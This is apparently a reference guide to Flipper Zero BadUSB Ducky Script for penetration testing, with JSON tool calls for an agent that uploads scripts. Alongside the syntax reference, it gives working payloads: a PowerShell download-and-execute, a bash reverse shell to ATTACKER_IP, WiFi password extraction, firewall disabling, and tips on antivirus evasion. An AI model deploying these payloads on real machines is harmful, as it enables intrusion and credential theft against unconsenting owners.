# BadUSB File Format - Ducky Script Reference

## Overview

BadUSB allows Flipper Zero to emulate a USB keyboard/mouse for penetration testing and automation. Scripts use **Ducky Script** syntax (originally from USB Rubber Ducky) and are stored as `.txt` files in `/ext/badusb/`.

**File Location:** `/ext/badusb/`
**File Extension:** `.txt`
**Format:** Plain text with Ducky Script commands

---

## Basic Syntax

### Comments
```
REM This is a comment
REM Comments are ignored during execution
```

### Delays
```
DELAY 500                  REM Wait 500 milliseconds
DEFAULT_DELAY 100          REM Set default delay between commands
DEFAULTDELAY 100           REM Alternative syntax
```

### String Typing
```
STRING Hello World         REM Type the string
STRINGLN Hello World       REM Type string + ENTER
```

---

## Keyboard Commands

### Special Keys
```
ENTER                      REM Press Enter/Return
SPACE                      REM Press Space
TAB                        REM Press Tab
ESCAPE (or ESC)            REM Press Escape
BACKSPACE                  REM Press Backspace
DELETE                     REM Press Delete
END                        REM Press End
HOME                       REM Press Home
INSERT                     REM Press Insert
PAGEUP                     REM Press Page Up
PAGEDOWN                   REM Press Page Down
CAPSLOCK                   REM Toggle Caps Lock
NUMLOCK                    REM Toggle Num Lock
SCROLLLOCK                 REM Toggle Scroll Lock
PRINTSCREEN                REM Press Print Screen
```

### Arrow Keys
```
UP (or UPARROW)            REM Press Up Arrow
DOWN (or DOWNARROW)        REM Press Down Arrow
LEFT (or LEFTARROW)        REM Press Left Arrow
RIGHT (or RIGHTARROW)      REM Press Right Arrow
```

### Function Keys
```
F1, F2, F3, ..., F12       REM Press function keys
```

---

## Modifier Keys

### Single Modifiers
```
GUI (or WINDOWS/COMMAND)   REM Press Windows/Command key
CTRL (or CONTROL)          REM Press Control
SHIFT                      REM Press Shift
ALT (or OPTION)            REM Press Alt/Option
```

### Modifier Combinations
```
CTRL-ALT DELETE            REM Ctrl+Alt+Del
CTRL-SHIFT ESC             REM Ctrl+Shift+Esc
ALT-TAB                    REM Alt+Tab
GUI r                      REM Windows+R (Run dialog)
```

---

## Common Payload Examples

### Example 1: Windows Run Dialog
```
REM Open notepad via Run dialog
DELAY 1000
GUI r
DELAY 500
STRING notepad.exe
ENTER
```

### Example 2: Open PowerShell
```
REM Open PowerShell as Admin (Windows)
DELAY 1000
GUI x
DELAY 300
STRING a
DELAY 500
ALT y
```

### Example 3: Terminal Command
```
REM Open terminal and run command (Linux/Mac)
DELAY 1000
CTRL-ALT t
DELAY 500
STRING echo "Hello from Flipper Zero"
ENTER
```

### Example 4: URL Launch
```
REM Open browser and navigate to URL
DELAY 1000
GUI r
DELAY 500
STRING https://example.com
ENTER
```

### Example 5: Information Gathering
```
REM Get system information (Windows)
DELAY 1000
GUI r
DELAY 500
STRING cmd
ENTER
DELAY 1000
STRING systeminfo > %TEMP%\sysinfo.txt
ENTER
STRING type %TEMP%\sysinfo.txt
ENTER
DELAY 2000
STRING exit
ENTER
```

---

## Advanced Examples

### PowerShell Download & Execute
```
REM Download and execute script (Windows)
DELAY 1000
GUI r
DELAY 500
STRING powershell
CTRL-SHIFT ENTER
DELAY 2000
ALT y
DELAY 1000
STRING $url = "http://example.com/script.ps1"
ENTER
STRING IEX (New-Object Net.WebClient).DownloadString($url)
ENTER
```

### Reverse Shell (Educational)
```
REM Reverse shell example (Linux)
REM CAUTION: Use only in authorized testing!
DELAY 1000
CTRL-ALT t
DELAY 500
STRING bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
ENTER
```

### WiFi Password Extraction (Windows)
```
REM Extract WiFi passwords (Windows)
DELAY 1000
GUI r
DELAY 500
STRING cmd
ENTER
DELAY 1000
STRING netsh wlan show profiles | findstr "All User Profile"
ENTER
DELAY 2000
STRING netsh wlan show profile name="WIFI_NAME" key=clear
ENTER
DELAY 3000
STRING exit
ENTER
```

---

## Platform-Specific Commands

### Windows
```
GUI r                      REM Open Run dialog
GUI                        REM Open Start menu
GUI d                      REM Show Desktop
GUI l                      REM Lock computer
GUI e                      REM Open Explorer
GUI x                      REM Open Power User menu
```

### macOS
```
GUI SPACE                  REM Spotlight search
GUI TAB                    REM Application switcher
CTRL-GUI q                 REM Lock screen
```

### Linux
```
CTRL-ALT t                 REM Open terminal (most distros)
GUI                        REM Open application menu
ALT-F2                     REM Run command dialog
```

---

## Best Practices

### 1. Start with Delay
Always start scripts with a delay to allow the target to recognize the USB device:
```
REM Wait for device recognition
DELAY 1000
```

### 2. Add Delays Between Actions
Give the system time to process each command:
```
GUI r
DELAY 500                  REM Wait for Run dialog
STRING notepad
DELAY 100
ENTER
```

### 3. Use Comments
Document your payloads for future reference:
```
REM ================================
REM Payload: System Information
REM Target: Windows 10/11
REM Author: Your Name
REM Date: 2026-02-25
REM ================================
```

### 4. Test Thoroughly
- Test on a **safe, isolated system** first
- Account for different keyboard layouts
- Consider varying system speeds

### 5. Error Handling
Add delays and checks for slow systems:
```
DELAY 2000                 REM Extra time for slow systems
```

---

## Safety & Legal Considerations

### ⚠️ WARNING: Legal Use Only

BadUSB payloads can be dangerous and must only be used:
- On systems you own
- With explicit written authorization
- During authorized penetration testing engagements
- For educational purposes in controlled environments

### Unauthorized use is ILLEGAL and may result in:
- Criminal prosecution
- Civil liability
- Loss of professional certifications
- Permanent career damage

### Ethical Guidelines
1. **Authorization First** - Always get written permission
2. **Scope Boundaries** - Stay within authorized scope
3. **Data Protection** - Handle captured data responsibly
4. **Disclosure** - Report findings through proper channels
5. **No Harm** - Avoid destructive or harmful payloads

---

## Common Pitfalls

### 1. Keyboard Layout Differences
Characters may differ between layouts (US vs UK vs International):
```
REM @ symbol: Shift+2 (US) vs Shift+' (UK)
REM Test target keyboard layout first
```

### 2. Execution Speed
Fast execution can cause missed keystrokes:
```
REM Too fast - may fail
STRING password
ENTER

REM Better - add delays
STRING password
DELAY 100
ENTER
```

### 3. Window Focus
Commands may execute in wrong window:
```
REM Ensure correct window is focused
DELAY 1000                 REM Wait for window
ALT-TAB                    REM Switch if needed
DELAY 500                  REM Wait for focus
```

### 4. Security Software
Antivirus and EDR may block execution:
```
REM Test with target's security software
REM Use obfuscation if authorized
```

---

## Debugging Tips

### 1. Add Visual Feedback
```
REM Open notepad to see output
GUI r
DELAY 500
STRING notepad
ENTER
DELAY 1000
STRING Script is running...
```

### 2. Slow Down Execution
```
REM Increase delays for debugging
DEFAULT_DELAY 500
```

### 3. Step-by-Step Testing
```
REM Test each section separately
REM Comment out later sections
```

### 4. Log to File
```
REM Save output for analysis
STRING echo "Step 1 complete" >> debug.log
ENTER
```

---

## File Organization

### Directory Structure
```
/ext/badusb/
├── info_gathering/
│   ├── system_info.txt
│   └── network_enum.txt
├── persistence/
│   ├── registry_key.txt
│   └── startup_script.txt
├── credential_access/
│   ├── wifi_passwords.txt
│   └── browser_dump.txt
└── exfiltration/
    ├── data_upload.txt
    └── reverse_shell.txt
```

### Naming Conventions
- Use descriptive names: `wifi_password_extraction.txt`
- Include target OS: `windows_system_info.txt`
- Version payloads: `persistence_v2.txt`

---

## Ducky Script vs Flipper Zero

### Flipper Zero Differences
1. **No REPEAT command** - Use explicit loops
2. **No LED commands** - Not applicable
3. **File execution** - No need for ATTACKMODE
4. **Simpler syntax** - Basic Ducky Script only

### Supported Commands
Flipper Zero supports core Ducky Script v1.0 commands. Advanced features from Rubber Ducky v2 are not supported.

---

## Example Payloads Library

### 1. Rick Roll
```
REM Classic prank payload
DELAY 1000
GUI r
DELAY 500
STRING https://www.youtube.com/watch?v=dQw4w9WgXcQ
ENTER
```

### 2. Lock Screen
```
REM Lock Windows computer
DELAY 500
GUI l
```

### 3. Open Task Manager
```
REM Windows Task Manager
DELAY 500
CTRL-SHIFT ESC
```

### 4. Screenshot & Save
```
REM Take screenshot (Windows)
DELAY 1000
PRINTSCREEN
DELAY 500
GUI r
DELAY 500
STRING mspaint
ENTER
DELAY 2000
CTRL v
DELAY 500
CTRL s
DELAY 500
STRING screenshot.png
ENTER
```

### 5. Disable Firewall (Authorized Testing Only)
```
REM Disable Windows Firewall (Admin required)
DELAY 1000
GUI x
DELAY 300
STRING a
DELAY 500
ALT y
DELAY 1000
STRING netsh advfirewall set allprofiles state off
ENTER
DELAY 500
STRING exit
ENTER
```

---

## Troubleshooting

### Script Not Executing
1. Check file is in `/ext/badusb/`
2. Verify `.txt` extension
3. Check for syntax errors
4. Increase initial delay

### Missing Keystrokes
1. Add delays between commands
2. Increase `DEFAULT_DELAY`
3. Check keyboard layout compatibility

### Wrong Characters Typed
1. Verify target keyboard layout
2. Test special characters separately
3. Use ASCII codes if needed

### Antivirus Blocking
1. Test without AV first (isolated system)
2. Use obfuscation techniques (if authorized)
3. Try alternative command sequences

---

## References

### Official Documentation
- Flipper Zero BadUSB: https://docs.flipper.net/bad-usb
- Ducky Script: https://github.com/hak5darren/USB-Rubber-Ducky/wiki/Duckyscript

### Community Resources
- Hak5 Forums: https://forums.hak5.org/
- Flipper Zero Discord: https://flipperzero.one/discord
- GitHub Payloads: https://github.com/hak5/usbrubberducky-payloads

---

## Tool Usage

### Upload Script
```json
{
  "tool": "flipper_badusb_upload",
  "params": {
    "filename": "test_payload",
    "script": "DELAY 1000\nGUI r\nDELAY 500\nSTRING notepad\nENTER",
    "validate": true
  }
}
```

### List Scripts
```json
{
  "tool": "flipper_badusb_list",
  "params": {}
}
```

### Read Script
```json
{
  "tool": "flipper_badusb_read",
  "params": {
    "filename": "test_payload.txt"
  }
}
```

### Validate Script
```json
{
  "tool": "flipper_badusb_validate",
  "params": {
    "script": "DELAY 1000\nSTRING test\nENTER"
  }
}
```

### Delete Script
```json
{
  "tool": "flipper_badusb_delete",
  "params": {
    "filename": "old_payload.txt"
  }
}
```

---

## Conclusion

BadUSB is a powerful tool for physical security testing. Always:
- ✅ Get proper authorization
- ✅ Test in safe environments
- ✅ Document your payloads
- ✅ Follow responsible disclosure
- ✅ Respect legal and ethical boundaries

**Remember:** With great power comes great responsibility. Use BadUSB ethically and legally.
